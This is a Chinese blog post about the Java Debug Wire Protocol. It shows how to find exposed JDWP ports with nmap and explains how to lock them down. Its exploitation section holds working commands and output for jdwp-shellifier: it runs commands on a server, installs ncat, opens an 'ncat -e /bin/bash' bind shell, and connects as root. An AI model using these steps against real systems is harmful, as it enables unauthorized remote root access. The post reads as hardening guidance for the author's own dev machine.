title: jdwp远程调试与安全
tags: jdwp
category: jvm
toc: true
date: 2018-08-12 06:12:16
---


# 什么是JDWP？

> JDWP（Java Debug Wire Protocol）是一个为 Java 调试而设计的一个通讯交互协议，它定义了调试器和被调试程序之间**传递的信息的格式**。在 JPDA 体系中，作为前端（front-end）的调试者（debugger）进程和后端（back-end）的被调试程序（debuggee）进程之间的交互数据的格式就是由 JDWP 来描述的，它详细完整地定义了请求命令、回应数据和错误代码，保证了前端和后端的 JVMTI 和 JDI 的通信通畅。比如在 Sun 公司提供的实现中，它提供了一个名为 jdwp.dll（jdwp.so）的动态链接库文件，这个动态库文件实现了一个 Agent，它会负责解析前端发出的请求或者命令，并将其转化为 JVMTI 调用，然后将 JVMTI 函数的返回值封装成 JDWP 数据发还给后端。



```
Components                          Debugger Interfaces

                /    |--------------|
               /     |     VM       |
 debuggee ----(      |--------------|  <------- JVM TI - Java VM Tool Interface
               \     |   back-end   |
                \    |--------------|
                /           |
 comm channel -(            |  <--------------- JDWP - Java Debug Wire Protocol
                \           |
                     |--------------|
                     | front-end    |
                     |--------------|  <------- JDI - Java Debug Interface
                     |      UI      |
                     |--------------|
```

[JVM TI](https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jvmti) -**Java VM Tool Interface**

Defines the debugging services a VM provides.

[JDWP](https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jdwp) - **Java Debug Wire Protocol**

Defines the communication between [debuggee](https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#debuggee) and debugger processes.

[JDI](https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jdi) - **Java Debug Interface**

Defines a high-level Java language interface which tool developers can easily use to write remote debugger applications.



# 发现开启了JDWP的端口

## nmap

`nmap`是端口扫描的利器，支持批量扫描网段内端口打开的情况。通过`nmap`的扫描可以找到端口和对应的协议，这样就可以扫描到打开了远程debug的端口的机器。

```bash
➜  ~  sudo nmap -sV 221.221.221.221
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 12:12 CST
Nmap scan report for izbp16k6k2yv9vvh6c3v65zi (221.221.221.221)
Host is up (0.033s latency).
Not shown: 972 closed ports
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.4 (protocol 2.0)
42/tcp    filtered nameserver
80/tcp    open     http           nginx 1.10.2
111/tcp   open     rpcbind        2-4 (RPC #100000)
135/tcp   filtered msrpc
139/tcp   filtered netbios-ssn
443/tcp   open     ssl/http       nginx 1.10.2
445/tcp   filtered microsoft-ds
593/tcp   filtered http-rpc-epmap
901/tcp   filtered samba-swat
1068/tcp  filtered instl_bootc
3128/tcp  filtered squid-http
3333/tcp  filtered dec-notes
3690/tcp  open     svnserve       Subversion
4444/tcp  filtered krb524
5800/tcp  filtered vnc-http
5900/tcp  filtered vnc
6129/tcp  filtered unknown
6667/tcp  filtered irc
7070/tcp  open     http           nginx 1.10.3
8081/tcp  open     http           Apache Tomcat 8.5.13
8180/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1
8181/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1
9001/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1
9011/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1
9998/tcp  open     http           Jetty 9.4.7.v20170914
9999/tcp  open     http           Jetty 9.2.24.v20180105
10010/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.42 seconds
```

从扫描的结果中可以看到`10010`端口开启了远程调试。

### 端口明明开了，却没有扫描到？

nmap默认只扫描每个协议常见的1000个端口，如果你的端口不在里面，默认就不会扫描。

> [Nmap scans the most common 1,000 ports for each protocol](https://nmap.org/book/man-port-specification.html). If your port is not in that list, it won't be scanned. 

端口使用的频率存储在`nmap-services`文件中：

```bash
➜  jdwp-shellifier (master|✔) locate nmap-services
/usr/local/Cellar/nmap/7.70/share/nmap/nmap-services
```

可以直接查看这个文件， 也可以使用下面的命令查看对应的频率：

```
➜  jdwp-shellifier (master|✔) sudo nmap -v -oG - -sSU
Password:
# Nmap 7.70 scan initiated Fri Aug 10 13:46:47 2018 as: nmap -v -oG - -sSU
# Ports scanned: TCP(1000;1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521...省略

```

具体说明参见： [FAQ missing port - SecWiki](https://secwiki.org/w/FAQ_missing_port)

解决方案：

`nmap`中可以通过`-p`指定扫描的端口范围：

```bash
➜  ~  sudo nmap -sV 221.221.221.221  -p 1-65535
Password:
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 12:26 CST
Nmap scan report for izbp16k6k2yv9vvh6c3v65zi (221.221.221.221)
Host is up (0.035s latency).
Not shown: 65464 closed ports
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.4 (protocol 2.0)
42/tcp    filtered nameserver
80/tcp    open     http           nginx 1.10.2
111/tcp   open     rpcbind        2-4 (RPC #100000)
135/tcp   filtered msrpc
136/tcp   filtered profile
137/tcp   filtered netbios-ns
138/tcp   filtered netbios-dgm
139/tcp   filtered netbios-ssn
443/tcp   open     ssl/http       nginx 1.10.2
445/tcp   filtered microsoft-ds
593/tcp   filtered http-rpc-epmap
901/tcp   filtered samba-swat
1068/tcp  filtered instl_bootc
2745/tcp  filtered urbisnet
3127/tcp  filtered ctx-bridge
3128/tcp  filtered squid-http
3333/tcp  filtered dec-notes
3690/tcp  open     svnserve       Subversion
3691/tcp  open     svnserve       Subversion
4444/tcp  filtered krb524
4999/tcp  open     http           Apache httpd 2.4.10 ((Debian))
5554/tcp  filtered sgi-esphttp
5800/tcp  filtered vnc-http
5900/tcp  filtered vnc
6129/tcp  filtered unknown
6176/tcp  filtered unknown
6379/tcp  open     redis          Redis key-value store
6667/tcp  filtered irc
7070/tcp  open     http           nginx 1.10.3
8076/tcp  open     http           Apache Tomcat 8.5.13
8081/tcp  open     http           Apache Tomcat 8.5.13
8146/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1
8180/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1
8181/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1
8183/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1
8188/tcp  open     unknown
8189/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1
8280/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1
8283/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121
8380/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1
8399/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121
8694/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1
8967/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121
8998/tcp  filtered canto-roboflow
9001/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1
9011/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1
9058/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121
9060/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_171
9260/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121
9928/tcp  open     http           Jetty 9.2.24.v20180105
9988/tcp  open     http           Jetty 9.2.24.v20180105
9990/tcp  open     http           Jetty 9.4.7.v20170914
9991/tcp  open     http           Jetty 9.4.8.v20171121
9996/tcp  filtered palace-5
9997/tcp  open     http           Jetty 9.4.8.v20171121
9998/tcp  open     http           Jetty 9.4.7.v20170914
9999/tcp  open     http           Jetty 9.2.24.v20180105
10010/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121
10018/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121
11114/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_171
11211/tcp open     memcached      Memcached 1.4.34 (uptime 20219548 seconds)
12001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1
12003/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121
13001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1
13003/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121
14002/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1
15001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1
18694/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121
19998/tcp open     http           Jetty 9.4.7.v20170914
29998/tcp open     http           Jetty 9.4.7.v20170914

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.05 seconds
```

上面是dev机器上开启的端口， `Java Debug Wire Protocol (Reference Implementation) `就是开启了`JDWP`的机器。

## 二次确认

>telnet端口后，输入命令JDWP-Handshake
如果返回JDWP-Handshake，证明存在漏洞。

可以用下面的命令测试：

```bash
➜  jdwp-shellifier (master|✔) { echo "JDWP-Handshake"; sleep 20 } | telnet 221.221.221.221 10010
Trying 221.221.221.221...
Connected to izbp16k6k2yv9vvh6c3v65zi.
Escape character is '^]'.
JDWP-Handshake
```

或者使用`nc`

```bash
➜  jdwp-shellifier (master|✔) { echo "JDWP-Handshake"; sleep 1 | trap exit INT} | nc 221.221.221.221 10010
JDWP-Handshake
```



# 漏洞利用实战

## 确定debug的端口

通过`nmap`确定debug的端口：

```bash
18694/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) 
```

## nmap执行命令

[jdwp-exec NSE Script](https://nmap.org/nsedoc/scripts/jdwp-exec.html)

[jdwp-info NSE Script](https://nmap.org/nsedoc/scripts/jdwp-info.html)

[jdwp-inject NSE Script](https://nmap.org/nsedoc/scripts/jdwp-inject.html)



>这种方式没有实验成功，有兴趣的同学可以试一试

- Example Usage

```
nmap -sT <target> -p <port> --script=+jdwp-exec --script-args cmd="date"
```

- Script Output

```
PORT     STATE SERVICE REASON
2010/tcp open  search  syn-ack
| jdwp-exec:
|   date output:
|   Sat Aug 11 15:27:21 Central European Daylight Time 2012
|_
```

## 开源脚本

[IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)

使用：



```bash
➜  jdwp-shellifier (master|✔) python jdwp-shellifier.py -t 221.221.221.221 -p 10010  --break-on "java.lang.String.indexOf"  --cmd "touch /home/777"
[+] Targeting '221.221.221.221:10010'
[+] Reading settings for 'Java HotSpot(TM) 64-Bit Server VM - 1.8.0_121'
[+] Found Runtime class: id=346d
[+] Found Runtime.getRuntime(): id=7fd8f420b170
[+] Created break event id=2
[+] Waiting for an event on 'java.lang.String.indexOf'
[+] Received matching event from thread 0x355c
[+] Selected payload 'touch /home/777'
[+] Command string object created id:355d
[+] Runtime.getRuntime() returned context id:0x355e
[+] found Runtime.exec(): id=7fd8f40140f0
[+] Runtime.exec() successful, retId=355f
[!] Command successfully executed
```

`break-on "java.lang.String.indexOf"`表示在这个函数打断点，当这个函数执行的时候， 后面跟着的命令就会执行，这时我们登录上机器查看下执行的结果：

```bash
[root@yd-dev-api server]# ls -alh  /home
总用量 52K
drwxr-xr-x. 13 root          root          4.0K 8月  10 14:12 .
dr-xr-xr-x. 28 root          root          4.0K 7月  19 17:52 ..
-rw-r--r--   1 root          root             0 8月  10 14:12 777
```

可以看到`777`这个文件已经创建了， 时间正好是我们执行命令的时间。

这只是初级玩法， 脚本的示例给的是启动一个`ncat`的程序， 然后就可以远程连接上这个ncat开启的端口，相当于有一个`root`权限的shell了。

安装`ncat`

```
python jdwp-shellifier.py -t 221.221.221.221 -p 8399  --break-on "java.lang.String.indexOf"  --cmd  "sudo yum install -y nc"
```

`ncat`在服务器上开启一个端口， 转发输入交给`bash`去执行。

开启转发服务：

```bash
➜  jdwp-shellifier (master|✔) python jdwp-shellifier.py -t 221.221.221.221 -p 8399  --break-on "java.lang.String.indexOf"  --cmd  "ncat -v -l -p 7777 -e /bin/bash"
[+] Targeting '221.221.221.221:8399'
[+] Reading settings for 'Java HotSpot(TM) 64-Bit Server VM - 1.8.0_121'
[+] Found Runtime class: id=345e
[+] Found Runtime.getRuntime(): id=7f6420023408
[+] Created break event id=2
[+] Waiting for an event on 'java.lang.String.indexOf'
[+] Received matching event from thread 0x354e
[+] Selected payload 'ncat -v -l -p 7777 -e /bin/bash'
[+] Command string object created id:354f
[+] Runtime.getRuntime() returned context id:0x3550
[+] found Runtime.exec(): id=7f6420023468
[+] Runtime.exec() successful, retId=3551
[!] Command successfully executed
```

服务器上端口已经开启：

```
[root@yd-dev-api server]# sudo lsof -i:7777
COMMAND  PID USER   FD   TYPE    DEVICE SIZE/OFF NODE NAME
ncat    7617 root    3u  IPv6 292856080      0t0  TCP *:cbt (LISTEN)
ncat    7617 root    4u  IPv4 292856081      0t0  TCP *:cbt (LISTEN)
```

连接上去：

```bash
➜  jdwp-shellifier (master|✔) nc 221.221.221.221 7777
pwd
/root
whoami
root
ls -alh
total 218M
dr-xr-x---. 18 root root 4.0K Aug 10 11:05 .
dr-xr-xr-x. 28 root root 4.0K Jul 19 17:52 ..
-rw-r--r--   1 root root   26 May 11 13:57 12.txt
-rwxr-xr-x   1 root root 1.7K Jan 30  2018 214468302700277.key
-rwxr-xr-x   1 root root 3.3K Jan 30  2018 214468302700277.pem
```



# 远程调试的建议

一、线上不能开启debug，对服务器性能有影响。

二、关闭对外远程debug的端口

```bash
sudo lsof -i:<port>
```

查找到对应的进程， 然后修改配置，**重启tomcat**

三、远程debug步骤：

1. tomcat 开启调试: 

   ```bash
   export CATALINA_OPTS="-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=127.0.0.1:8399"
   ```

   **注意必须绑定到127.0.0.1**

2. 安装socat

   ```bash
   sudo yum install -y socat
   ```

3. 服务器安装socat进行转发:

   ```bash
   socat TCP4-LISTEN:5005forkrange=0.0.0.0/32 TCP4:127.0.0.1:8399 | hostname -i
   ```

   其中`0.0.0.0/32`表示放开ip限制（不是内网没有办法限制出口ip)， **命令不要在后台执行**，否则跟开启了对外的远程debug没有区别

4. idea中新建Remote配置，host写上面输出的公网的ip， 端口写5005

# 结论



- 远程调试端口的地址一定要绑定到`127.0.0.1`
- tomcat用单独的组的用户启动（这个组的权限要设置到较低）

# 参考

- [深入 Java 调试体系: 第 1 部分，JPDA 体系概览](https://www.ibm.com/developerworks/cn/java/j-lo-jpda1/index.html?ca=drs-)
- [Java Platform Debugger Architecture](https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html)
- [Java(tm) Debug Wire Protocol](https://docs.oracle.com/javase/7/docs/technotes/guides/jpda/jdwp-spec.html)
- [Java Debugger Internals - Meetup](http://files.meetup.com/3189882/Java%20Debugger%20Internals.pdf)
- [Java Debug Remote Code Execution · 安全手册](https://_thorns.gitbooks.io/sec/content/java_debug_remote_code_execution.html)
- [FAQ missing port - SecWiki](https://secwiki.org/w/FAQ_missing_port)
- [IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
- [Hacking the Java Debug Wire Protocol - or - “How I met your Java debugger” | IOActive](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)
- [jdwp-exec NSE Script](https://nmap.org/nsedoc/scripts/jdwp-exec.html)
- [jdwp-info NSE Script](https://nmap.org/nsedoc/scripts/jdwp-info.html)
- [jdwp-inject NSE Script](https://nmap.org/nsedoc/scripts/jdwp-inject.html)



